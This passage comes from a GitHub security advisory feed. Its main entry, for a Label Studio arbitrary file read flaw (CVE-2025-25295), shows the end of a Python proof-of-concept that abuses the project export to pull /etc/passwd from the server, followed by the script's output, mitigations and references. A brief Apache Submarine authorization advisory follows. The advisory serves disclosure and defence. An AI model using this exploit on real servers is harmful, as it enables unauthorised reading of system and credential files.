task_id = response.json()['id']
print(f"Task created successfully, task id: {task_id}\n")

# Issue a dummy upload request to force the creation of the ~/data/images/upload folder
response = session.post(f"{BASE_URL}/api/projects/{project_id}/import?commit_to_project=false", files={"bar.png":"data"})

# Request the server to generate a zip with all of the project information and files (works for YOLO, COCO or VOC)
response = session.get(f"{BASE_URL}/api/projects/{project_id}/export?exportType={EXPORT_TYPE}&amp;download_all_tasks=true&amp;download_resources=true")
if (response.status_code != 200):
    print("Couldn't fetch export file")
    exit(0)

file_like_object = io.BytesIO(response.content)
zipfile_ob = zipfile.ZipFile(file_like_object)
print("Dumping /etc/passwd file contents:")
print(zipfile_ob.read("images/passwd").decode("utf-8"))
</code></pre>
<p>Output:</p>
<pre><code>$ python3 studio-min.py
Signing up...
Got CSRF token: CQXYq1qbQ5jMG2FjQfzodC3i6weiIMq9T6lqhBQLT94sbcLKOg0ZeZxep7hPKLM6
User registration response status code: 200

Logging in...
Login response status code: 200

Cookies after login:
csrftoken: PsEKLHstcGIXDFCP3OGQGCwKUFOdlN33
sessionid: .eJxVj8tyhSAQRP-FtVrIQ8Dl3ecbqAEGNRqwRKvyqPx7JHUXyXKme7rnfJFrCWQkTDHlpYit1jq2AiVrgQpoqZYATvSMu540JB8TpOUTziUnu69k7BuyQTntlqcl3aPiSklquOoUZ7pnoiEWrnO2V8HD_lbVnD87B37FVIXwCmnKnc_pPBbXVUv3VEv3kgNuj6f3X8AMZb6vTaQQuaaoghCOBqFMuJ8egjdGGu4oiMCDdkpHGEQMWhoXNUM59D5Q5-_QFXG3b1hhJgy2AkXYCt51BUupzPi-L8cHGen3D57HZCg:1tbQOv:nomwczhhTvAaXMoyRrO30lWR5UkGi7AqiUHKyshQJ30

Creating project...
Project ID: 10

Creating task with method is_uploaded_file (defaults to is_local_file)...
Task created successfully, task id: 10

Dumping /etc/passwd file contents:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
nginx:x:999:999:nginx user:/nonexistent:/usr/sbin/nologin
</code></pre>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Validate and sanitize file paths</li>
<li>Add an allowlist of directories and file types</li>
<li>Implement file access controls</li>
<li>Use randomized file names and secure file storage abstraction</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Authentication-required vulnerability allowing arbitrary file reads from the server filesystem. Potential exposure of sensitive information like configuration files, credentials, and confidential data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-rgv9-w7jp-m23g">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-rgv9-w7jp-m23g</a></li>
<li><a href="https://github.com/HumanSignal/label-studio-sdk/commit/4a9715c6b0b619371e89c09ea8d1c86ce5c880df">https://github.com/HumanSignal/label-studio-sdk/commit/4a9715c6b0b619371e89c09ea8d1c86ce5c880df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25295">https://nvd.nist.gov/vuln/detail/CVE-2025-25295</a></li>
<li><a href="https://github.com/advisories/GHSA-rgv9-w7jp-m23g">https://github.com/advisories/GHSA-rgv9-w7jp-m23g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgv9-w7jp-m23g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-14T15:16:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-submarine] Apache Submarine Server Core Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6q97-8v3g-rpxw</id>
        <link href="https://github.com/advisories/GHSA-6q97-8v3g-rpxw"/>
        <updated>2025-02-13T18:41:55.000Z</updated>
        <content type="html"><![CDATA[<p>Incorrect Authorization vulnerability in Apache Submarine Server Core.</p>
<p>This issue affects Apache Submarine Server Core: from 0.8.0.</p>
<p>As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.</p>
<p>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36265">https://nvd.nist.gov/vuln/detail/CVE-2024-36265</a></li>
<li><a href="https://lists.apache.org/thread/prckhhst19qxof064hsm8cccxtofvflz">https://lists.apache.org/thread/prckhhst19qxof064hsm8cccxtofvflz</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/06/12/3">http://www.openwall.com/lists/oss-security/2024/06/12/3</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2024-98.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2024-98.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6q97-8v3g-rpxw">https://github.com/advisories/GHSA-6q97-8v3g-rpxw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q97-8v3g-rpxw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-12T15:31:45.000Z</published>
    </entry>
</feed>